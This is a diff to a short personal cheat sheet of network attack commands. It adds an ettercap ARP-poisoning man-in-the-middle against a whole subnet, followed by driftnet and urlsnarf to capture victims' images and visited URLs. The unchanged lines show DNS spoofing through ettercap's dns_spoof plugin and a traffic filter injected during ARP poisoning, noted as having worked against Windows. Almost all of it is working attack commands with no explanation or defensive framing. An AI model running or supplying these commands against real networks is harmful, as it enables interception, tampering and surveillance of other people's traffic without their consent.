@@ -15,6 +15,11 @@ ettercap -G
         unified sniffing->scan for hosts->select targets->sniff remote conn
 
 
+ettercap -T -q -M ARP /// ///
+driftnet -i eth0 
+urlsnarf -i eth0
+
+
 #Sample DNS attack
 
 nano /etc/ettercap/etter.dns
@@ -31,5 +36,5 @@ ettercap -T -q -M arp -P dns_spoof // // -i eth0
 
 $ etterfilter my_filter.filter -o my_filter.ef
 
-ettercap -T -q -F my_filter.ef -M ARP // //  ( ---->it worked after arp -d * in windows) 
+ettercap -T -q -F my_filter.ef -M ARP /// ///  ( ---->it worked after arp -d * in windows) 
 
